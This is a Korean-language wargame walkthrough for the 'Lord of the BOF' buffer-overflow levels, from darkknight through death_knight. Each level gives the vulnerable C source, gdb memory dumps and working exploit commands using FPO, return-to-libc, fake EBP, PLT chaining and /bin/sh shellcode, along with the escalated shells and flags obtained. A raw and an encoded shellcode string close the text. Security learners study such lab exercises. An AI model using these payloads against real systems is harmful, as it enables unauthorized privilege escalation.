#include <stdlib.h>

void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
	if(argc<2){
		printf("argv error\n");
		exit(0);
	}

	problem_child(argv[1]);
}
```

이제까지와는 다르게 ebp의 한 바이트만 덮을 수 있다. 문제 컨셉으로 알려준 FPO(Frame Pointer Overflow)는 메인 함수 내부에서 서브 함수가 불릴 때, 서브 함수의 ebp를 덮을 수 있으면 아주 유용한 exploit 기법이 된다. `leave; ret`는 `mov esp, ebp; pop ebp; pop eip`처럼 동작하는데, 서브 함수에서 FPO가 발생할 때, 즉 함수 에필로그 동작을 두 번 일으킬 수 있으면 eip 조작이 가능하다.

서브 함수에서 ebp를 shellcode_pointer-0x4 위치로 바꾼다면, 서브 함수가 끝나고, 메인 함수의 에필로그 과정에서 pop ebp; pop eip 동작을 통해 eip가 shellcode를 가리킬 수 있게 된다. 물론 조작된 ebp는 메인 함수의 동작을 커버할 수 있는 만큼의 스택 프레임을 형성할 수 있어야 할 것이며, shellcode가 저장된 주소 값을 나타내는 pointer가 메모리 내에 존재해야 할 것이다.



다음의 메모리 상황을 보면, ebp+0x8 위치에 존재하는 argv pointer를 shellcode pointer로 사용할 수 있음을 알 수 있다.

```shell
(gdb) x/10wx $ebp
0xbffffabc:	0xbffffac8	0x0804849e	0xbffffc29	0xbffffae8
0xbffffacc:	0x400309cb	0x00000002	0xbffffb14	0xbffffb20
0xbffffadc:	0x40013868	0x00000002
(gdb) x/20wx 0xbffffc29
0xbffffc29:	0x90909090	0x90909090	0x6850c031	0x68732f2f
0xbffffc39:	0x69622f68	0x50e3896e	0x99e18953	0x80cd0bb0
0xbffffc49:	0x90909090	0x90909090	0x57500042	0x682f3d44
0xbffffc59:	0x2f656d6f	0x656c6f67	0x4552006d	0x45544f4d
0xbffffc69:	0x54534f48	0x3239313d	0x3836312e	0x2e37312e
```

물론 실제 메모리 주소랑 약간씩 달라서 core 파일 분석이 필요함.



```shell
[golem@localhost golem]$ ./darkknight `python -c 'print "\x90"*(40-24-8)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*8+"\xb0"'`
1󿿐h//shh/bin⏓ᙰ
              ̀°𙻿¿	@ 
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
bash$ my-pass
euid = 512
new attacker
```





## darkknight -> bugbear

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - bugbear
        - RTL1
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] == '\xbf')
	{
		printf("stack betrayed you!!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}
```

RTL 문제라는군. 적당히 /bin/sh 문자열을 만들어주든, libc 안에 존재하는 문자열을 찾든 해서 문자열 주소를 알아내고 `system() + dummy + &"/bin/sh"`를 시전해주자.



gdb 상에서 보는거랑 libc base가 같으니 system 함수 주소 역시 gdb에서 찾은 거랑 실제랑 같을 것이다.

```shell
[darkknight@localhost darkknight]$ cat /proc/1631/maps 
08048000-08049000 r-xp 00000000 08:06 161290     /home/darkknight/bugbear-cp
08049000-0804a000 rw-p 00000000 08:06 161290     /home/darkknight/bugbear-cp
40000000-40013000 r-xp 00000000 08:08 34138      /lib/ld-2.1.3.so
40013000-40014000 rw-p 00012000 08:08 34138      /lib/ld-2.1.3.so
40014000-40015000 rw-p 00000000 00:00 0
40018000-40105000 r-xp 00000000 08:08 34145      /lib/libc-2.1.3.so
40105000-40109000 rw-p 000ec000 08:08 34145      /lib/libc-2.1.3.so
40109000-4010d000 rw-p 00000000 00:00 0
bfffe000-c0000000 rwxp fffff000 00:00 0
[darkknight@localhost darkknight]$ ldd bugbear
	libc.so.6 => /lib/libc.so.6 (0x40018000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
```



argv[2]에 /bin/sh를 넣고 ㄱㄱ

```shell
[darkknight@localhost darkknight]$ ./bugbear `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"AAAA"+"\x34\xfc\xff\xbf" + " /bin/sh;"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAɀAAAA4
bash$ id    
uid=512(darkknight) gid=512(darkknight) euid=513(bugbear) egid=513(bugbear) groups=512(darkknight)
bash$ my-pass
euid = 513
new divide
```





## bugbear -> giant

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - giant
        - RTL2
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(int argc, char *argv[])
{
	char buffer[40];
	FILE *fp;
	char *lib_addr, *execve_offset, *execve_addr;
	char *ret;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// gain address of execve
	fp = popen("/usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'", "r");
	fgets(buffer, 255, fp);
	sscanf(buffer, "(%x)", &lib_addr);
	fclose(fp);

	fp = popen("/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'", "r");
	fgets(buffer, 255, fp);
	sscanf(buffer, "%x", &execve_offset);
	fclose(fp);

	execve_addr = lib_addr + (int)execve_offset;
	// end

	memcpy(&ret, &(argv[1][44]), 4);
	if(ret != execve_addr)
	{
		printf("You must use execve!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}
```

popen 함수는 command를 실행시킨 뒤, pipe를 통해 연결시킨다. 따라서, 위의 동작을 정리하자면 실제 메모리에 올라간 library의 시작 주소와 libc 내에서 `__execve` 함수의 offset을 구하여 실제 메모리 상에 존재하는 `__execve` 함수의 주소를 구한 뒤, ret에 해당 주소가 제대로 들어갔는지 확인한다 정도가 되겠다. giant 파일을 복사한 파일을 대상으로 gdb로 디버깅을 해보면 권한 문제로 ldd로 명령어가 제대로 파싱을 해주지 못하기 때문에, set 명령어로 값을 직접 메모리에 넣어주던가 해야한다. 아니면 뭐 그 전까지는 안봐도 되고.

뭐 결국 execve 함수를 실행해서 쉘을 따라. 정도가 문제의 컨셉이다. 근데, 아무리 생각해봐도 execve 함수의 인자를 만들어주는게 귀찮을 것 같아서 다른 방법을 시도했다. execve 함수의 인자는 실행할 파일 이름의 문자열을 가진 포인터와 그 문자열의 주소를 가리키는 포인터 혹은 null이 필요한데, strcpy 함수의 특성상 null을 전달하기는 힘들기 때문에 execve를 그냥 버리기로 함.

걍 실행할 파일 이름을 제대로 전달하지 않으면 얌전히 execve의 ret에 등록된 곳을 실행한다. 

```shell
"A"*44 | &__execve | &__system | AAAA | &binsh
```

이처럼 하면, 0x41414141 주소를 제대로 읽을 수 없기 때문에, 얌전히 execve는 종료가 되고, execve가 종료가 되면서 system 함수를 부르고 system 함수는 &binsh 문자열을 파일 이름으로 인식하여 실행시킨다.

다음은 필요한 자원들의 주소이다. /bin/sh 문자열의 library base와의 offset은 xxd 명령어로 구할 수 있음.

```shell
0x400fbff9:	 "/bin/sh"
(gdb) p __execve
$1 = {int (char *, char **, char **)} 0x400a9d48 <__execve>
(gdb) x/wx 0x40018000 + 0x91d48
0x400a9d48 <__execve>:	0x57e58955
(gdb) p system
$2 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
```

뾰로롱

```shell
[bugbear@localhost bugbear]$ ./giant "`python -c 'print "A"*44+"\x48\x9d\x0a\x40"+"\xe0\x8a\x05\x40"+"\xe0\x91\x03\x40"+"\xf9\xbf\x0f\x40"'`"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH 
@ɀσ@
bash$ id    
uid=513(bugbear) gid=513(bugbear) euid=514(giant) egid=514(giant) groups=513(bugbear)
bash$ my-pass
euid = 514
one step closer
```

잌 플래그 만드신분이 linkin park를 좋아하시는 건가 ㅋㅋ 이전 문제 플래그랑 엮어보니 그런거 같기도 한듯.



## STAGE : giant -> assassin

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - assassin
        - no stack, no RTL
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] == '\xbf')
	{
		printf("stack retbayed you!\n");
		exit(0);
	}

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer+sfp hunter
        memset(buffer, 0, 44);
}
```

ret에 스택 주소도 올 수 없고, library 주소도 올 수 없다. 그럼 뭐 .text를 활용하라는 뜻인듯.

fake ebp가 생각이 났으나, 굳이 거기까지 않하고 ret 자리를 ret 명령어 주소로 덮으면 `ret+4` 위치에 존재하는 주소가 실행이 된다. 

```shell
"A"*44 | &ret | &system | "BBBB" | &binsh
```



objdump랑 gdb 이용해서 적당히 구한 자원들

```shell
 8048464:	c3                   	ret    
 8048465:	90                   	nop    

0x400fbff9:	 "/bin/sh"
(gdb) p system
$2 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
```



뿅

```shell
[giant@localhost giant]$ ./assassin `python -c 'print "A"*44 + "\x64\x84\x04\x08" + "\xe0\x8a\x05\x40" + "BBBB" + "\xf9\xbf\x0f\x40"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAɀBBBB
bash$ id     
uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)
bash$ my-pass
euid = 515
pushing me away
```

확실히 플래그 설정하신 분은 linkin park 노래를 좋아하는게 분명하다.





## STAGE : assassin -> zombie_assassin

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - zombie_assassin
        - FEBP
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] == '\xbf')
	{
		printf("stack retbayed you!\n");
		exit(0);
	}

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

	// strncpy instead of strcpy!
	strncpy(buffer, argv[1], 48); 
	printf("%s\n", buffer);
}
```

Fake ebp 기법이다. 

다음과 사용할 가젯들을 촵촵촵 찾아내고,

```shell
 8048517:	c9                   	leave  
 8048518:	c3                   	ret  
 
 [assassin@localhost assassin]$ xxd /lib/libc.so.6 | grep "/bin/sh"
00e3ff0: 2030 0073 6800 2d63 002f 6269 6e2f 7368   0.sh.-c./bin/sh
00e6580: 302d 6300 7368 002f 6269 6e2f 7368 002d  0-c.sh./bin/sh.-
00e6590: 6300 7368 002f 6269 6e2f 7368 0074 6d70  c.sh./bin/sh.tmp
00e81c0: 3027 0020 090a 002f 6269 6e2f 7368 002d  0'. .../bin/sh.-
00e8770: 6269 6e2f 6373 6800 2f62 696e 2f73 6800  bin/csh./bin/sh.

(gdb) x/s 0x40018000+0xe3ff0
0x400fbff0:	 " 0"
(gdb) 
0x400fbff3:	 "sh"
(gdb) 
0x400fbff6:	 "-c"
(gdb) 
0x400fbff9:	 "/bin/sh"

(gdb) p system
$2 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
```

다음과 같이 페이로드를 구상하면

```shell
"AAAA" | &system | "BBBB" | &binsh | buffer | &leave_ret
```



읔

```shell
[assassin@localhost assassin]$ ./zombie_assassin `python -c 'print "AAAA"+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"+"A"*24 + "\x70\xfa\xff\xbf" + "\x17\x85\x04\x08"'`
AAAAɀAAAA񿀁AAAAAAAAAAAAAAAAAAAAAAp󽗅 
bash$ id    
uid=515(assassin) gid=515(assassin) euid=516(zombie_assassin) egid=516(zombie_assassin) groups=515(assassin)
bash$ my-pass
euid = 516
no place to hide
```

플래그를 검색해보니 NSA의 감시에 대한 책이 나오는데, 2014년에 나온 책인데 이 문제 출제 년도랑 맞나....?

처음에 buffer가 아니라 argv에 RTL을 넣어서 했는데 잘 안됐다; 왠지 모르게 2바이트씩 주소차이가 나기도 하고... 





## zombie_assassin -> succubus

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - succubus
        - calling functions continuously 
*/

#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

// the inspector
int check = 0;

void MO(char *cmd)
{
        if(check != 4)
                exit(0);

        printf("welcome to the MO!\n");

	// olleh!
	system(cmd);
}

void YUT(void)
{
        if(check != 3)
                exit(0);

        printf("welcome to the YUT!\n");
        check = 4;
}

void GUL(void)
{
        if(check != 2)
                exit(0);

        printf("welcome to the GUL!\n");
        check = 3;
}

void GYE(void)
{
	if(check != 1)
		exit(0);

	printf("welcome to the GYE!\n");
	check = 2;
}

void DO(void)
{
	printf("welcome to the DO!\n");
	check = 1;
}

main(int argc, char *argv[])
{
	char buffer[40];
	char *addr;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// you cannot use library
	if(strchr(argv[1], '\x40')){
		printf("You cannot use library\n");
		exit(0);
	}

	// check address
	addr = (char *)&DO;
        if(memcmp(argv[1]+44, &addr, 4) != 0){
                printf("You must fall in love with DO\n");
                exit(0);
        }

        // overflow!
        strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // stack destroyer
	// 100 : extra space for copied argv[1]
        memset(buffer, 0, 44);
	memset(buffer+48+100, 0, 0xbfffffff - (int)(buffer+48+100));

	// LD_* eraser
	// 40 : extra space for memset function
	memset(buffer-3000, 0, 3000-40);
}
```

웬만한 부분을 다 작살내버리니 하라는대로 주어진 함수들을 차근차근 실행시키도록 하자. 마지막 MO() 함수의 인자로 줄 /bin/sh는 페이로드 마지막에 붙이도록 한다.

```shell
DO() -> GYE() -> GUL() -> YUT() -> MO() 
========================================
DO() : 0x80487ec
GYE() : 0x80487bc
GUL() : 0x804878c
YUT() : 0x804875c
MO() : 0x8048724
```

ㄱㄱㄱ

```shell
[zombie_assassin@localhost zombie_assassin]$ ./succubus `python -c 'print "A"*44+"\xec\x87\x04\x08"+"\xbc\x87\x04\x08"+"\x8c\x87\x04\x08"+"\x5c\x87\x04\x08"+"\x24\x87\x04\x08"+"AAAA"+"\x88\xfa\xff\xbf"+"/bin/sh"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA󽮢in/sh
welcome to the DO!
welcome to the GYE!
welcome to the GUL!
welcome to the YUT!
welcome to the MO!
bash$ id
uid=516(zombie_assassin) gid=516(zombie_assassin) euid=517(succubus) egid=517(succubus) groups=516(zombie_assassin)
bash$ my-pass
euid = 517
here to stay	
```





## succubus -> nightmare

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - nightmare
        - PLT
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dumpcode.h>

main(int argc, char *argv[])
{
	char buffer[40];
	char *addr;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// check address
	addr = (char *)&strcpy;
        if(memcmp(argv[1]+44, &addr, 4) != 0){
                printf("You must fall in love with strcpy()\n");
                exit(0);
        }

        // overflow!
        strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

	// dangerous waterfall
	memset(buffer+40+8, 'A', 4);
}
```

음 저 &strcpy 값이 뭔지 궁금했는데, 해보니까 strcpy 함수의 PLT 주소가 나오더라. strcpy의 ret를 AAAA로 초기화해버리기 때문에, 값을 다시 덮어쓰지 않는한 흑마법 사용이 불가능하다. 

그래서 strcpy 함수를 이용하여 ret를 덮어쓰게 하면 됨!

```shell
[succubus@localhost succubus]$ ./nightmare `python -c 'print "A"*44+"\x10\x84\x04\x08"+"AAAA"+"\x80\xfa\xff\xbf"+"\x8c\xfa\xff\xbf"+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA󿍺ÿ¿ɀAAAA
bash$ id    
uid=517(succubus) gid=517(succubus) euid=518(nightmare) egid=518(nightmare) groups=517(succubus)
bash$ my-pass
euid = 518
beg for me
```

~~나..나랑 배그할래? ..ㅈㅅ~~ 

흠 linkin park 뿐만 아니라 Korn도 좋아하시나 보다.





## STAGE : nightmare -> xavius

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - xavius
        - arg
*/

#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

main()
{
	char buffer[40];
	char *ret_addr;

	// overflow!
	fgets(buffer, 256, stdin);
	printf("%s\n", buffer);

	if(*(buffer+47) == '\xbf')
	{
		printf("stack retbayed you!\n");
		exit(0);
	}

	if(*(buffer+47) == '\x08')
        {
                printf("binary image retbayed you, too!!\n");
                exit(0);
        }

	// check if the ret_addr is library function or not
	memcpy(&ret_addr, buffer+44, 4);
	while(memcmp(ret_addr, "\x90\x90", 2) != 0)	// end point of function
	{
		if(*ret_addr == '\xc9'){		// leave
			if(*(ret_addr+1) == '\xc3'){	// ret
				printf("You cannot use library function!\n");
				exit(0);
			}
		}
		ret_addr++; 
	}

        // stack destroyer
        memset(buffer, 0, 44);
	memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));

	// LD_* eraser
	// 40 : extra space for memset function
	memset(buffer-3000, 0, 3000-40);
}
```

스택이랑 프로그램 코드는 원천봉쇄되었고, 심지어 ret에만 값을 쓸 수 있다. 라이브러리를 사용하려 해도 함수의 에필로그 과정에서 감지가 되기 때문에 사용하기는 힘들 것 같다.

솔직히 처음 든 생각은 라이브러리를 로드시킬 수 있으니,  적당히 asm 코딩을 해서 leave; ret가 없는 shell 실행함수를 만드는 것이었는데, 으ㅏ으ㅏ이ㅏ아ㅣ 하던 와중 STDIN으로 입력받는게 생각이 났다. 대충 fgets의 입력으로 AAAAAAA... 를 입력했을 경우 다음과 같이 발견할 수 있다. fgets의 인자로 들어가는 STDIN은 전역변수 포인터인데, 해당 값을 참조해보면 `_IO_FILE` structure를 따라갈 수 있고, 해당 구조체에 존재하는 buffer의 포인터를 따라가보면 내가 stdin으로 입력한 값을 볼 수 있다. 

```shell
0x804871a <main+6>:	mov    %eax,%ds:0x8049a3c
0x804871f <main+11>:	push   %eax
0x8048720 <main+12>:	push   0x100
0x8048725 <main+17>:	lea    %eax,[%ebp-40]
0x8048728 <main+20>:	push   %eax
0x8048729 <main+21>:	call   0x8048408 <fgets>
0x804872e <main+26>:	add    %esp,12

(gdb) x/x 0x8049a3c
0x8049a3c <stdin@@GLIBC_2.0>:	0x401068c0
(gdb) x/20wx 0x401068c0
0x401068c0 <_IO_2_1_stdin_>:	0xfbad2288	0x4001501e	0x4001501e	0x40015000
0x401068d0 <_IO_2_1_stdin_+16>:	0x40015000	0x40015000	0x40015000	0x40015000
0x401068e0 <_IO_2_1_stdin_+32>:	0x40015400	0x00000000	0x00000000	0x00000000
0x401068f0 <_IO_2_1_stdin_+48>:	0x00000000	0x00000000	0x00000000	0x00000000
0x40106900 <_IO_2_1_stdin_+64>:	0xffffffff	0x00000000	0x401068a0	0xffffffff
(gdb) x/20wx 0x40015000
0x40015000:	0x41414141	0x41414141	0x41414141	0x41414141
0x40015010:	0x41414141	0x41414141	0x41414141	0x00000a41
0x40015020:	0x00000000	0x00000000	0x00000000	0x00000000
0x40015030:	0x00000000	0x00000000	0x00000000	0x00000000
0x40015040:	0x00000000	0x00000000	0x00000000	0x00000000
```



다음은 `/usr/include/libio.h`에 정의되어 있는 _IO_FILE structure이다.

```c
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags
  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  /*  char* _save_gptr;  char* _save_egptr; */
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```



사실 이게 로더에 있는지는 몰랐는데 저기보면 실행권한이 존재하는 주소여서 쉘코드 뙇뙇뙇!이 가능함

```shell
08048000-08049000 r-xp 00000000 08:06 177429     /home/nightmare/xavius-cp
08049000-0804a000 rw-p 00000000 08:06 177429     /home/nightmare/xavius-cp
40000000-40013000 r-xp 00000000 08:08 34138      /lib/ld-2.1.3.so
40013000-40014000 rw-p 00012000 08:08 34138      /lib/ld-2.1.3.so
40014000-40015000 rw-p 00000000 00:00 0
40018000-40105000 r-xp 00000000 08:08 34145      /lib/libc-2.1.3.so
40105000-40109000 rw-p 000ec000 08:08 34145      /lib/libc-2.1.3.so
40109000-4010d000 rw-p 00000000 00:00 0
bfffe000-c0000000 rwxp fffff000 00:00 0
```



뙇뙇뙇

```shell
[nightmare@localhost nightmare]$ (python -c 'print "A"*44+"\x60\x50\x01\x40"+"\x90"*0x100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"';cat)|./xavius
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`P@ 
id
uid=518(nightmare) gid=518(nightmare) euid=519(xavius) egid=519(xavius) groups=518(nightmare)
my-pass      
euid = 519
throw me away
```





## STAGE : xavius -> death_knight

```shell
/*
        The Lord of the BOF : The Fellowship of the BOF
        - dark knight
        - remote BOF
*/

#include <stdio.h> 
#include <stdlib.h> 
#include <errno.h> 
#include <string.h> 
#include <sys/types.h> 
#include <netinet/in.h> 
#include <sys/socket.h> 
#include <sys/wait.h> 
#include <dumpcode.h>

main()
{
	char buffer[40];

	int server_fd, client_fd;  
	struct sockaddr_in server_addr;   
	struct sockaddr_in client_addr; 
	int sin_size;

	if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
		perror("socket");
		exit(1);
	}

	server_addr.sin_family = AF_INET;        
	server_addr.sin_port = htons(6666);   
	server_addr.sin_addr.s_addr = INADDR_ANY; 
	bzero(&(server_addr.sin_zero), 8);   

	if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){
		perror("bind");
		exit(1);
	}

	if(listen(server_fd, 10) == -1){
		perror("listen");
		exit(1);
	}
        
	while(1) {  
		sin_size = sizeof(struct sockaddr_in);
		if((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size)) == -1){
			perror("accept");
			continue;
		}
            
		if (!fork()){ 
			send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);
			send(client_fd, "You : ", 6, 0);
			recv(client_fd, buffer, 256, 0);
			close(client_fd);
			break;
		}
            
		close(client_fd);  
		while(waitpid(-1,NULL,WNOHANG) > 0);
	}
	close(server_fd);
}
```









```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81

```


